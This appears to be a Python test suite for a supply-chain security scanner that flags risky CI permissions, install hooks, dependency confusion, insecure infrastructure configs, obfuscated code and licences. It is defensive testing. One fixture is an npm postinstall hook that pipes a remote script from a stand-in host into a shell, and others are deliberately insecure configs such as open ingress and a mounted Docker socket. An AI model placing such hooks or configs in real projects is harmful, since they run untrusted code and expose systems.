"""The five capabilities that read manifests, workflows, infrastructure and artefacts.

Each test asserts the rule fires on a real file laid out the way the real
thing is laid out, and — more importantly — that it stays quiet on the safe
version of the same file. A rule that cannot be silenced by fixing the code
is not a rule, it is noise.
"""

from __future__ import annotations

import json
import os
import shutil
import tempfile
import unittest

from jscr.boundary.fs import RepositoryBoundary
from jscr.scanners.artefacts import ArtefactScanner
from jscr.scanners.iac import IacScanner
from jscr.scanners.licences import LicenceScanner
from jscr.scanners.manifest import ManifestScanner
from jscr.scanners.workflow import WorkflowPermissionScanner
from jscr.supply.inventory import read_inventory
from jscr.supply.licences import classify
from jscr.supply.sbom import build_sbom


class ScannerCase(unittest.TestCase):
    def setUp(self) -> None:
        self.root = tempfile.mkdtemp(prefix="jscr-supply-")

    def tearDown(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, relative: str, content: str) -> str:
        path = os.path.join(self.root, relative)
        directory = os.path.dirname(path)
        if directory and not os.path.isdir(directory):
            os.makedirs(directory)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(content)
        return relative

    def run_scanner(self, scanner, *relatives):
        boundary = RepositoryBoundary(root=self.root)
        return scanner.scan(boundary, list(relatives))

    def rules(self, result):
        return sorted(f.rule_id for f in result.findings)


class WorkflowPermissionsTest(ScannerCase):
    def test_write_all_is_high(self) -> None:
        path = self.write(
            ".github/workflows/ci.yml",
            (
                "name: ci\n"
                "on: push\n"
                "permissions: write-all\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
            ),
        )
        result = self.run_scanner(WorkflowPermissionScanner(), path)
        self.assertIn("jscr/ci-permissions-write-all", self.rules(result))
        self.assertEqual("High", result.findings[0].severity)

    def test_missing_block_is_reported(self) -> None:
        path = self.write(
            ".github/workflows/ci.yml",
            ("name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"),
        )
        result = self.run_scanner(WorkflowPermissionScanner(), path)
        self.assertIn("jscr/ci-permissions-missing", self.rules(result))

    def test_least_privilege_is_silent(self) -> None:
        path = self.write(
            ".github/workflows/ci.yml",
            (
                "name: ci\n"
                "on: push\n"
                "permissions:\n"
                "  contents: read\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
            ),
        )
        result = self.run_scanner(WorkflowPermissionScanner(), path)
        self.assertEqual([], result.findings)


class ManifestTest(ScannerCase):
    def test_postinstall_piping_to_a_shell(self) -> None:
        path = self.write(
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "scripts": {"postinstall": "curl https://example.invalid/i.sh | sh"},
                }
            ),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertIn("jscr/install-script-dangerous", self.rules(result))

    def test_plain_postinstall_is_low(self) -> None:
        path = self.write(
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "scripts": {"postinstall": "node ./scripts/build.js"},
                }
            ),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertEqual(["jscr/install-script-present"], self.rules(result))
        self.assertEqual("Low", result.findings[0].severity)

    def test_no_automatic_hook_is_silent(self) -> None:
        path = self.write(
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "scripts": {"test": "jest", "build": "tsc"},
                }
            ),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertEqual([], result.findings)

    def test_internal_name_without_a_scope(self) -> None:
        path = self.write(
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "dependencies": {"acme-internal-auth": "^1.0.0"},
                }
            ),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertIn("jscr/dependency-confusion-name", self.rules(result))

    def test_scoped_name_is_silent(self) -> None:
        path = self.write(
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "dependencies": {"@acme/internal-auth": "^1.0.0"},
                }
            ),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertEqual([], result.findings)

    def test_pip_extra_index_is_high(self) -> None:
        path = self.write(
            "requirements.txt",
            ("--extra-index-url https://packages.acme.invalid/simple\nrequests==2.31.0\n"),
        )
        result = self.run_scanner(ManifestScanner(), path)
        self.assertEqual(["jscr/pip-extra-index"], self.rules(result))
        self.assertEqual("High", result.findings[0].severity)


class IacTest(ScannerCase):
    def test_open_ingress(self) -> None:
        path = self.write(
            "main.tf",
            (
                'resource "aws_security_group" "web" {\n'
                "  ingress {\n"
                '    cidr_blocks = ["0.0.0.0/0"]\n'
                "  }\n"
                "}\n"
            ),
        )
        result = self.run_scanner(IacScanner(), path)
        self.assertEqual(["jscr/iac-open-ingress"], self.rules(result))
        self.assertIn("0.0.0.0/0", result.findings[0].evidence)

    def test_commented_line_is_ignored(self) -> None:
        path = self.write("main.tf", '# cidr_blocks = ["0.0.0.0/0"]\n')
        result = self.run_scanner(IacScanner(), path)
        self.assertEqual([], result.findings)

    def test_privileged_pod(self) -> None:
        path = self.write(
            "deploy.yaml",
            (
                "apiVersion: apps/v1\n"
                "kind: Deployment\n"
                "spec:\n"
                "  template:\n"
                "    spec:\n"
                "      containers:\n"
                "        - name: app\n"
                "          securityContext:\n"
                "            privileged: true\n"
            ),
        )
        result = self.run_scanner(IacScanner(), path)
        self.assertIn("jscr/k8s-privileged", self.rules(result))

    def test_docker_socket_mount(self) -> None:
        path = self.write(
            "docker-compose.yml",
            (
                "services:\n"
                "  ci:\n"
                "    image: builder\n"
                "    volumes:\n"
                "      - /var/run/docker.sock:/var/run/docker.sock\n"
            ),
        )
        result = self.run_scanner(IacScanner(), path)
        self.assertIn("jscr/k8s-docker-socket", self.rules(result))


class ArtefactTest(ScannerCase):
    def test_hex_identifiers_are_obfuscation(self) -> None:
        names = " ".join("_0x{0:04x}a".format(n) for n in range(8))
        path = self.write("src/app.js", "var " + names.replace(" ", ", ") + ";\n")
        result = self.run_scanner(ArtefactScanner(), path)
        self.assertIn("jscr/obfuscated-identifiers", self.rules(result))

    def test_long_line_in_dist_is_info(self) -> None:
        path = self.write("dist/bundle.js", "var a=1;" * 200 + "\n")
        result = self.run_scanner(ArtefactScanner(), path)
        self.assertEqual(["jscr/minified-file"], self.rules(result))
        self.assertEqual("Info", result.findings[0].severity)

    def test_ordinary_source_is_silent(self) -> None:
        path = self.write("src/app.js", "function add(a, b) {\n  return a + b;\n}\n")
        result = self.run_scanner(ArtefactScanner(), path)
        self.assertEqual([], result.findings)

    def test_evidence_is_present_at_the_cited_line(self) -> None:
        path = self.write(
            "src/app.js", "\n\nvar " + ", ".join("_0x{0:04x}b".format(n) for n in range(8)) + ";\n"
        )
        result = self.run_scanner(ArtefactScanner(), path)
        with open(os.path.join(self.root, path), encoding="utf-8") as handle:
            lines = handle.read().splitlines()
        for finding in result.findings:
            if finding.evidence:
                self.assertIn(finding.evidence, lines[finding.line - 1])


class LicenceTest(ScannerCase):
    def test_agpl_dependency_is_reported(self) -> None:
        path = self.write(
            "package-lock.json",
            json.dumps(
                {
                    "lockfileVersion": 3,
                    "packages": {
                        "node_modules/thing": {"version": "1.0.0", "license": "AGPL-3.0-only"},
                    },
                }
            ),
        )
        result = self.run_scanner(LicenceScanner(), path)
        self.assertIn("jscr/licence-network-copyleft", self.rules(result))

    def test_permissive_only_reports_the_summary(self) -> None:
        path = self.write(
            "package-lock.json",
            json.dumps(
                {
                    "lockfileVersion": 3,
                    "packages": {"node_modules/thing": {"version": "1.0.0", "license": "MIT"}},
                }
            ),
        )
        result = self.run_scanner(LicenceScanner(), path)
        self.assertEqual(["jscr/licence-clear"], self.rules(result))
        self.assertEqual("Info", result.findings[0].severity)


class InventoryTest(ScannerCase):
    def test_reads_every_ecosystem(self) -> None:
        paths = [
            self.write(
                "package.json",
                json.dumps(
                    {
                        "dependencies": {"left-pad": "1.3.0"},
                        "devDependencies": {"jest": "^29.0.0"},
                    }
                ),
            ),
            self.write("requirements.txt", "requests==2.31.0\n# comment\n"),
            self.write(
                "go.mod", "module example.com/app\n\nrequire github.com/pkg/errors v0.9.1\n"
            ),
        ]

        def reader(path: str) -> str:
            with open(os.path.join(self.root, path), encoding="utf-8") as handle:
                return handle.read()

        packages = read_inventory(reader, paths)
        names = sorted(p.name for p in packages)
        self.assertEqual(["github.com/pkg/errors", "jest", "left-pad", "requests"], names)

    def test_sbom_states_what_it_did_not_do(self) -> None:
        path = self.write("package.json", json.dumps({"dependencies": {"left-pad": "1.3.0"}}))

        def reader(relative: str) -> str:
            with open(os.path.join(self.root, relative), encoding="utf-8") as handle:
                return handle.read()

        document = build_sbom(reader, [path], project="fixture", version="1.0.0")
        self.assertEqual("CycloneDX", document["bomFormat"])
        self.assertEqual(1, len(document["components"]))
        self.assertEqual("pkg:npm/left-pad@1.3.0", document["components"][0]["purl"])
        values = {p["name"]: p["value"] for p in document["metadata"]["properties"]}
        self.assertEqual("declared-only", values["jscr:resolution"])
        self.assertEqual("none", values["jscr:network"])


class ClassifyTest(unittest.TestCase):
    def test_or_expression_takes_the_most_permissive_branch(self) -> None:
        self.assertEqual("permissive", classify("MIT OR GPL-3.0-only")[0])

    def test_absence_is_unknown_not_permissive(self) -> None:
        self.assertEqual("unknown", classify("")[0])


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
